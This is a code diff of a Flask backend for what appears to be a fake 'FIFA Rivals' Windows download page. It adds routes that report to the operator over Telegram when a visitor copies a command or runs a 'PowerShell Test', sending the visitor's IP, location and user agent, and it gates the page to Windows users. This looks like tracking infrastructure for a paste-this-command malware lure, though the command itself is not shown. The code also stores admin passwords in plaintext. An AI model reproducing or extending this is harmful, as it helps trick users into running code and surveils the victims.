@@ -1,4 +1,4 @@
-from flask import Flask, render_template, jsonify, request, redirect, url_for, flash
+from flask import Flask, render_template, jsonify, request, redirect, url_for, flash, session
 from flask_sqlalchemy import SQLAlchemy
 from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
 from datetime import datetime, timedelta
@@ -12,13 +12,33 @@ from functools import wraps
 import re
 from collections import defaultdict
 import uuid
-
-app = Flask(__name__)
-app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'your-secret-key-here')
+from dotenv import load_dotenv
+import geoip2.database
 
 # Configure logging
-logging.basicConfig(level=logging.INFO)
+logging.basicConfig(level=logging.DEBUG)
 logger = logging.getLogger(__name__)
+
+# Load environment variables
+load_dotenv()
+
+app = Flask(__name__)
+app.config['SECRET_KEY'] = os.getenv('SECRET_KEY')
+
+# Set up database configuration for Render PostgreSQL
+DATABASE_URL = os.getenv('DATABASE_URL')
+if DATABASE_URL:
+    # Handle special case for Render.com's DATABASE_URL format
+    if DATABASE_URL.startswith("postgres://"):
+        DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)
+    app.config['SQLALCHEMY_DATABASE_URI'] = DATABASE_URL
+else:
+    # Fallback for local development
+    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///fifa_rivals.db'
+
+app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
+
+logger.info(f"Database URI: {app.config['SQLALCHEMY_DATABASE_URI']}")
 
 # Telegram Configuration
 TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
@@ -47,21 +67,6 @@ def send_telegram_message(message):
         except Exception as e:
             logger.error(f"Failed to start Telegram message thread: {e}")
 
-# Database configuration
-database_url = os.environ.get('DATABASE_URL')
-if database_url:
-    # Handle Render's postgres:// vs postgresql:// difference
-    if database_url.startswith("postgres://"):
-        database_url = database_url.replace("postgres://", "postgresql://", 1)
-    app.config['SQLALCHEMY_DATABASE_URI'] = database_url
-else:
-    # Local SQLite database as fallback
-    db_path = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'database', 'fifa_rivals.db')
-    os.makedirs(os.path.dirname(db_path), exist_ok=True)
-    app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:///{db_path}'
-
-app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
-
 # Get download URL from environment variable
 WINDOWS_DOWNLOAD_URL = os.environ.get('WINDOWS_DOWNLOAD_URL')
 ANDROID_DOWNLOAD_URL = os.environ.get('ANDROID_DOWNLOAD_URL')
@@ -75,16 +80,17 @@ login_manager = LoginManager(app)
 login_manager.login_view = 'admin_login'
 
 # Database Models
-class User(UserMixin, db.Model):
+class Admin(UserMixin, db.Model):
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String(80), unique=True, nullable=False)
     password = db.Column(db.String(120), nullable=False)
 
 class Visit(db.Model):
     id = db.Column(db.Integer, primary_key=True)
-    timestamp = db.Column(db.DateTime, nullable=False, default=datetime.utcnow)
-    is_mobile = db.Column(db.Boolean, nullable=False)
-    ip_address = db.Column(db.String(45))
+    ip_address = db.Column(db.String(45), nullable=False)
+    country = db.Column(db.String(100))
+    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
+    type = db.Column(db.String(20), default='VISIT')
 
 class Download(db.Model):
     id = db.Column(db.Integer, primary_key=True)
@@ -99,7 +105,7 @@ class BlockedIP(db.Model):
 
 @login_manager.user_loader
 def load_user(user_id):
-    return User.query.get(int(user_id))
+    return Admin.query.get(int(user_id))
 
 # Bot protection configurations
 BLOCKED_IPS = set()  # This will now stay empty
@@ -216,7 +222,7 @@ def is_ip_blocked(ip_address):
     """Check if an IP is blocked using exact match or pattern matching"""
     blocked_patterns = BlockedIP.query.all()
     for blocked in blocked_patterns:
-        if blocked.ip_pattern in ip_address or ip_address in blocked.ip_pattern:
+        if re.match(f"^{re.escape(blocked.ip_pattern)}.*", ip_address):
             return True
     return False
 
@@ -242,184 +248,227 @@ def device_protection(f):
         return f(*args, **kwargs)
     return decorated_function
 
+def check_ip_middleware():
+    def decorator(f):
+        @wraps(f)
+        def decorated_function(*args, **kwargs):
+            if request.remote_addr and is_ip_blocked(request.remote_addr):
+                return "Access Denied", 403
+            return f(*args, **kwargs)
+        return decorated_function
+    return decorator
+
 @app.route('/')
-@bot_protection
-@device_protection
+@check_ip_middleware()
 def index():
+    return redirect(url_for('download'))
+
+@app.route('/track-visit', methods=['POST'])
+@check_ip_middleware()
+def track_visit():
     ip_address = request.remote_addr
-    user_agent = request.headers.get('User-Agent', '')
-    device_type = get_device_type()
+    country = "Unknown"
+    city = "Unknown"
     
-    # Only track visit and send notification if it's not a recent visit
-    if not is_recent_visit(ip_address):
-        # Add timestamp for this visit
-        visit_timestamps[ip_address].append(datetime.now())
-        
-        # Track visit in database
-        new_visit = Visit(is_mobile=False, ip_address=ip_address)
-        db.session.add(new_visit)
-        db.session.commit()
-
-        # Get country for the notification
-        country = get_country_from_ip(ip_address)
-
-        # Send Telegram notification with country
-        message = (
-            f"🌐 New Visit:\n"
-            f"IP: {ip_address}\n"
-            f"Country: {country}\n"
-            f"Device: Windows\n"
-            f"User Agent: {user_agent}"
-        )
-        send_telegram_message(message)
+    try:
+        with geoip2.database.Reader('GeoLite2-Country.mmdb') as reader:
+            response = reader.country(ip_address)
+            country = response.country.name
+            # Try to get city if available
+            try:
+                city_response = reader.city(ip_address)
+                city = city_response.city.name or "Unknown"
+            except:
+                pass
+    except:
+        pass
     
-    return render_template('download.html', device_type=device_type)
-
-@app.route('/track-download', methods=['POST'])
-@bot_protection
-@device_protection
-def track_download():
-    ip_address = request.remote_addr
-    user_agent = request.headers.get('User-Agent', '')
-    country = get_country_from_ip(ip_address)
-    
-    # Generate unique filename with timestamp for better tracking
-    timestamp = datetime.now().strftime('%m%d')
-    unique_id = str(uuid.uuid4())[:6]
-    unique_filename = f"v1_2_6_{timestamp}_{unique_id}.win"
-    
-    new_download = Download(ip_address=ip_address)
-    db.session.add(new_download)
+    # Record visit
+    visit = Visit(ip_address=ip_address, country=country, type='VISIT')
+    db.session.add(visit)
     db.session.commit()
-
-    if not WINDOWS_DOWNLOAD_URL:
-        return jsonify({
-            'success': False,
-            'message': 'Download URL is not configured.'
-        }), 500
-
-    # Send Telegram notification with country
-    message = (
-        f"⬇️ New Download:\n"
-        f"IP: {ip_address}\n"
-        f"Country: {country}\n"
-        f"Device: Windows\n"
-        f"File: {unique_filename}\n"
-        f"User Agent: {user_agent}"
-    )
+    
+    # Send Telegram notification
+    message = f"""👀 New Visit!
+<b>IP:</b> {ip_address}
+<b>Location:</b> {city}, {country}
+<b>User Agent:</b> {request.headers.get('User-Agent', 'Unknown')}"""
     send_telegram_message(message)
     
     return jsonify({
-        'success': True, 
-        'download_url': WINDOWS_DOWNLOAD_URL,
-        'filename': unique_filename
+        'success': True,
+        'location': {
+            'city': city,
+            'country': country
+        }
+    })
+
+@app.route('/track-command-copy', methods=['POST'])
+@check_ip_middleware()
+def track_command_copy():
+    ip_address = request.remote_addr
+    country = "Unknown"
+    city = "Unknown"
+    
+    try:
+        with geoip2.database.Reader('GeoLite2-Country.mmdb') as reader:
+            response = reader.country(ip_address)
+            country = response.country.name
+            # Try to get city if available
+            try:
+                city_response = reader.city(ip_address)
+                city = city_response.city.name or "Unknown"
+            except:
+                pass
+    except:
+        pass
+    
+    # Record command copy
+    visit = Visit(ip_address=ip_address, country=country, type='COMMAND_COPY')
+    db.session.add(visit)
+    db.session.commit()
+    
+    # Send Telegram notification
+    message = f"""📋 Command Copied!
+<b>IP:</b> {ip_address}
+<b>Location:</b> {city}, {country}
+<b>User Agent:</b> {request.headers.get('User-Agent', 'Unknown')}"""
+    send_telegram_message(message)
+    
+    return jsonify({
+        'success': True,
+        'location': {
+            'city': city,
+            'country': country
+        }
+    })
+
+@app.route('/download')
+@check_ip_middleware()
+def download():
+    # Record visit
+    ip_address = request.remote_addr
+    country = "Unknown"
+    
+    try:
+        with geoip2.database.Reader('GeoLite2-Country.mmdb') as reader:
+            response = reader.country(ip_address)
+            country = response.country.iso_code
+    except:
+        pass
+    
+    visit = Visit(ip_address=ip_address, country=country)
+    db.session.add(visit)
+    db.session.commit()
+    
+    # Send Telegram notification
+    message = f"🌐 Page Visit!\n<b>IP:</b> {ip_address}\n<b>Country:</b> {country}"
+    send_telegram_message(message)
+    
+    # Detect device type
+    user_agent = request.headers.get('User-Agent', '').lower()
+    device_type = 'windows' if 'windows' in user_agent else 'unsupported'
+    
+    # Get admin contact from environment
+    admin_contact = os.environ.get('ADMIN_CONTACT', 'https://t.me/FIFARivalsSupport')
+    
+    return render_template('download.html', device_type=device_type, admin_contact=admin_contact)
+
+@app.route('/track-download', methods=['POST'])
+@check_ip_middleware()
+def track_download():
+    ip_address = request.remote_addr
+    country = "Unknown"
+    
+    try:
+        with geoip2.database.Reader('GeoLite2-Country.mmdb') as reader:
+            response = reader.country(ip_address)
+            country = response.country.iso_code
+    except:
+        pass
+    
+    # Record test execution
+    visit = Visit(ip_address=ip_address, country=country, type='TEST')
+    db.session.add(visit)
+    db.session.commit()
+    
+    # Send Telegram notification
+    message = f"🔧 New PowerShell Test!\n<b>IP:</b> {ip_address}\n<b>Country:</b> {country}"
+    send_telegram_message(message)
+    
+    return jsonify({
+        'success': True,
+        'message': 'Test command executed successfully'
+    })
+
+@app.route('/request-download', methods=['POST'])
+@check_ip_middleware()
+def request_download():
+    ip_address = request.remote_addr
+    country = "Unknown"
+    city = "Unknown"
+    
+    try:
+        with geoip2.database.Reader('GeoLite2-Country.mmdb') as reader:
+            response = reader.country(ip_address)
+            country = response.country.name
+            # Try to get city if available
+            try:
+                city_response = reader.city(ip_address)
+                city = city_response.city.name or "Unknown"
+            except:
+                pass
+    except:
+        pass
+    
+    # Record download request
+    visit = Visit(ip_address=ip_address, country=country, type='DOWNLOAD_REQUEST')
+    db.session.add(visit)
+    db.session.commit()
+    
+    # Get contact info and format username
+    contact_info = request.json.get('contact', 'Not provided')
+    # Clean up username format
+    username = contact_info.strip()
+    if username.startswith('@'):
+        username = username[1:]  # Remove @ if present
+    
+    # Format Telegram message with better structure and emojis
+    message = f"""🎮 New Download Request!
+
+👤 <b>User:</b> @{username}
+🌍 <b>Location:</b> {city}, {country}
+🖥️ <b>IP:</b> {ip_address}
+🔍 <b>Device:</b> {request.headers.get('User-Agent', 'Unknown')}
+
+⏰ <i>Please contact the user as soon as possible!</i>"""
+    
+    send_telegram_message(message)
+    
+    return jsonify({
+        'success': True,
+        'message': 'Download request received. You will be redirected to chat with our admin.',
+        'location': {
+            'city': city,
+            'country': country
+        }
     })
 
 @app.route('/admin/login', methods=['GET', 'POST'])
-@bot_protection
-@device_protection
 def admin_login():
     if request.method == 'POST':
         username = request.form.get('username')
         password = request.form.get('password')
-        user = User.query.filter_by(username=username).first()
         
-        if user and user.password == password:  # In production, use proper password hashing
-            login_user(user)
+        admin = Admin.query.filter_by(username=username, password=password).first()
+        
+        if admin:
+            login_user(admin)
             return redirect(url_for('admin_dashboard'))
-        flash('Invalid credentials')
+        else:
+            flash('Invalid credentials')
+    
     return render_template('admin_login.html')
-
-@app.route('/admin/dashboard')
-@login_required
-def admin_dashboard():
-    # Get blocked IPs
-    blocked_ips = BlockedIP.query.order_by(BlockedIP.timestamp.desc()).all()
-    
-    # Basic statistics
-    total_visits = Visit.query.count()
-    total_downloads = Download.query.count()
-    conversion_rate = (total_downloads / total_visits * 100) if total_visits > 0 else 0
-    
-    # Time-based statistics
-    now = datetime.utcnow()
-    today = now.date()
-    this_month = today.replace(day=1)
-    
-    visits_today = Visit.query.filter(Visit.timestamp >= today).count()
-    downloads_today = Download.query.filter(Download.timestamp >= today).count()
-    visits_this_month = Visit.query.filter(Visit.timestamp >= this_month).count()
-    downloads_this_month = Download.query.filter(Download.timestamp >= this_month).count()
-    
-    # Country statistics
-    country_visits = {}
-    country_downloads = {}
-    
-    for visit in Visit.query.all():
-        country = get_country_from_ip(visit.ip_address)
-        country_visits[country] = country_visits.get(country, 0) + 1
-        
-    for download in Download.query.all():
-        country = get_country_from_ip(download.ip_address)
-        country_downloads[country] = country_downloads.get(country, 0) + 1
-    
-    # Sort countries by visits
-    top_countries = sorted(country_visits.items(), key=lambda x: x[1], reverse=True)[:10]
-    
-    # Recent activity
-    recent_activities = []
-    recent_visits = Visit.query.order_by(Visit.timestamp.desc()).limit(10).all()
-    recent_downloads = Download.query.order_by(Download.timestamp.desc()).limit(10).all()
-    
-    for visit in recent_visits:
-        country = get_country_from_ip(visit.ip_address)
-        recent_activities.append({
-            'type': 'Visit',
-            'timestamp': visit.timestamp,
-            'country': country,
-            'ip': visit.ip_address
-        })
-    
-    for download in recent_downloads:
-        country = get_country_from_ip(download.ip_address)
-        recent_activities.append({
-            'type': 'Download',
-            'timestamp': download.timestamp,
-            'country': country,
-            'ip': download.ip_address
-        })
-    
-    recent_activities.sort(key=lambda x: x['timestamp'], reverse=True)
-    
-    # Hourly statistics for today
-    hourly_stats = {
-        'visits': [0] * 24,
-        'downloads': [0] * 24
-    }
-    
-    today_visits = Visit.query.filter(Visit.timestamp >= today).all()
-    today_downloads = Download.query.filter(Download.timestamp >= today).all()
-    
-    for visit in today_visits:
-        hour = visit.timestamp.hour
-        hourly_stats['visits'][hour] += 1
-        
-    for download in today_downloads:
-        hour = download.timestamp.hour
-        hourly_stats['downloads'][hour] += 1
-    
-    return render_template('admin_dashboard.html',
-                         total_visits=total_visits,
-                         total_downloads=total_downloads,
-                         visits_today=visits_today,
-                         downloads_today=downloads_today,
-                         visits_this_month=visits_this_month,
-                         downloads_this_month=downloads_this_month,
-                         conversion_rate=round(conversion_rate, 1),
-                         top_countries=top_countries,
-                         recent_activities=recent_activities[:10],
-                         hourly_stats=hourly_stats,
-                         blocked_ips=blocked_ips)
 
 @app.route('/admin/logout')
 @login_required
@@ -427,16 +476,86 @@ def admin_logout():
     logout_user()
     return redirect(url_for('admin_login'))
 
+@app.route('/admin')
+@login_required
+def admin_dashboard():
+    # Calculate statistics
+    total_visits = Visit.query.filter_by(type='VISIT').count()
+    total_downloads = Visit.query.filter_by(type='DOWNLOAD').count()
+    conversion_rate = round((total_downloads / total_visits * 100) if total_visits > 0 else 0, 2)
+    
+    today = datetime.utcnow().date()
+    visits_today = Visit.query.filter(
+        Visit.type == 'VISIT',
+        Visit.timestamp >= today
+    ).count()
+    
+    downloads_today = Visit.query.filter(
+        Visit.type == 'DOWNLOAD',
+        Visit.timestamp >= today
+    ).count()
+    
+    this_month = today.replace(day=1)
+    visits_this_month = Visit.query.filter(
+        Visit.type == 'VISIT',
+        Visit.timestamp >= this_month
+    ).count()
+    
+    downloads_this_month = Visit.query.filter(
+        Visit.type == 'DOWNLOAD',
+        Visit.timestamp >= this_month
+    ).count()
+    
+    # Get hourly stats for today
+    hourly_stats = {
+        'visits': [0] * 24,
+        'downloads': [0] * 24
+    }
+    
+    today_visits = Visit.query.filter(Visit.timestamp >= today).all()
+    for visit in today_visits:
+        hour = visit.timestamp.hour
+        if visit.type == 'VISIT':
+            hourly_stats['visits'][hour] += 1
+        else:
+            hourly_stats['downloads'][hour] += 1
+    
+    # Get top countries
+    top_countries = db.session.query(
+        Visit.country,
+        db.func.count(Visit.id).label('count')
+    ).group_by(Visit.country).order_by(db.func.count(Visit.id).desc()).limit(10).all()
+    
+    # Get recent activities
+    recent_activities = Visit.query.order_by(Visit.timestamp.desc()).limit(50).all()
+    
+    # Get blocked IPs
+    blocked_ips = BlockedIP.query.order_by(BlockedIP.timestamp.desc()).all()
+    
+    return render_template('admin_dashboard.html',
+        total_visits=total_visits,
+        total_downloads=total_downloads,
+        conversion_rate=conversion_rate,
+        visits_today=visits_today,
+        downloads_today=downloads_today,
+        visits_this_month=visits_this_month,
+        downloads_this_month=downloads_this_month,
+        hourly_stats=hourly_stats,
+        top_countries=top_countries,
+        recent_activities=recent_activities,
+        blocked_ips=blocked_ips
+    )
+
 @app.route('/admin/block-ip', methods=['POST'])
 @login_required
 def block_ip():
     ip_pattern = request.form.get('ip_pattern')
-    reason = request.form.get('reason', 'No reason provided')
+    reason = request.form.get('reason')
     
     if not ip_pattern:
         flash('IP pattern is required')
         return redirect(url_for('admin_dashboard'))
-        
+    
     try:
         blocked_ip = BlockedIP(ip_pattern=ip_pattern, reason=reason)
         db.session.add(blocked_ip)
@@ -444,7 +563,7 @@ def block_ip():
         flash(f'Successfully blocked IP pattern: {ip_pattern}')
     except Exception as e:
         flash(f'Error blocking IP: {str(e)}')
-        
+    
     return redirect(url_for('admin_dashboard'))
 
 @app.route('/admin/unblock-ip/<int:id>', methods=['POST'])
@@ -457,15 +576,15 @@ def unblock_ip(id):
         flash(f'Successfully unblocked IP pattern: {blocked_ip.ip_pattern}')
     except Exception as e:
         flash(f'Error unblocking IP: {str(e)}')
-        
+    
     return redirect(url_for('admin_dashboard'))
 
 def init_db():
     with app.app_context():
         db.create_all()
-        # Create admin user if it doesn't exist
-        if not User.query.filter_by(username=ADMIN_USERNAME).first():
-            admin = User(username=ADMIN_USERNAME, password=ADMIN_PASSWORD)
+        # Create admin user if not exists
+        if not Admin.query.filter_by(username=os.getenv('ADMIN_USERNAME')).first():
+            admin = Admin(username=os.getenv('ADMIN_USERNAME'), password=os.getenv('ADMIN_PASSWORD'))
             db.session.add(admin)
             db.session.commit()
 
